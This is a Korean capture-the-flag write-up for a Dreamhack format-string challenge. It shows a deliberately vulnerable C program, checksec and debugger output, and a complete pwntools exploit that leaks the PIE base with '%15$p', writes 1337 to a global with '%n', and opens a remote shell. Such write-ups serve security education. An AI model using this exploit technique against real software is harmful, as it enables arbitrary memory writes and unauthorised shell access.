```c
// Name: fsb_overwrite.c
// Compile: gcc -o fsb_overwrite fsb_overwrite.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void get_string(char *buf, size_t size) {
  ssize_t i = read(0, buf, size);
  if (i == -1) {
    perror("read");
    exit(1);
  }
  if (i < size) {
    if (i > 0 && buf[i - 1] == '\n') i--;
    buf[i] = 0;
  }
}

int changeme;

int main() {
  char buf[0x20];
  
  setbuf(stdout, NULL);
  
  while (1) {
    get_string(buf, 0x20);
    printf(buf);
    puts("");
    if (changeme == 1337) {
      system("/bin/sh");
    }
  }
}
```

```bash
$ checksec ./fsb_overwrite
[*] './fsb_overwrite'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

# 분석

## 보호 기법

NX, PIE가 적용되어 있으며, stack canary는 적용되어 있지 않고, Full RELRO가 적용되어 있다.

## 코드 분석

* `fsb_overwrite.c:28-29` : `get_string` 함수로 얻은 문자열 `buf`를 바로 `printf` 함수에 인자로 넣고 있으므로 format string bug를 활용한다면 임의주소 읽기 및 쓰기가 가능하다.

# 공격

vmmap을 활용하여 `fsb_overwrite`의 베이스를 확인해보면, `0x555555554000`임을 알 수 있다.

```bash
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
    0x555555554000     0x555555555000 r--p     1000      0 ./fsb_overwrite
    0x555555555000     0x555555556000 r-xp     1000   1000 ./fsb_overwrite
    0x555555556000     0x555555557000 r--p     1000   2000 ./fsb_overwrite
    0x555555557000     0x555555558000 r--p     1000   2000 ./fsb_overwrite
    0x555555558000     0x555555559000 rw-p     1000   3000 ./fsb_overwrite
...
    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]
```

또한, `main` 함수의 `printf` 함수 직전에 breakpoint를 설정하여 해당 위치에서 스택에 저장된 데이터들을 확인해보면, `$rsp+0x48` 위치에 코드영역의 특정 데이터의 주소를 저장하고 있음을 확인할 수 있다.

```bash
pwndbg> x/10gx $rsp
0x7fffffffe040: 0x0000006161616161      0x0000000000000000
0x7fffffffe050: 0x0000000000000000      0x0000000000000000
0x7fffffffe060: 0x0000000000000000      0x46a6c73250bba100
0x7fffffffe070: 0x0000000000000001      0x00007ffff7db5d90
0x7fffffffe080: 0x0000000000000000      0x0000555555555293
```

위 정보들을 종합하면, `$rsp+0x48`에 저장된 값에서 `0x1293`을 빼주면 `fsb_overwrite`의 베이스를 알 수 있다는 사실을 알 수 있으며, 이를 활용하여 `changeme`의 주소를 알아낼 수 있다.
이를 종합하여 다음 익스플로잇 코드를 작성하면 flag를 얻을 수 있다.

```python
# Name: Format String Bug.py

from pwn import *

HOST = 'host3.dreamhack.games'
PORT = 9737
p = remote(HOST,PORT)
elf = ELF('./fsb_overwrite')

# Get address of changeme
p.send(b'%15$p')
leaked = int(p.recvline()[:-1], base=16)
code_base = leaked - 0x1293
changeme = code_base + elf.sym['changeme']

# Write 1337 to changeme
fstring = b'%1337c%8$n'.ljust(16)
fstring += p64(changeme)
p.sendline(fstring)

p.interactive()
```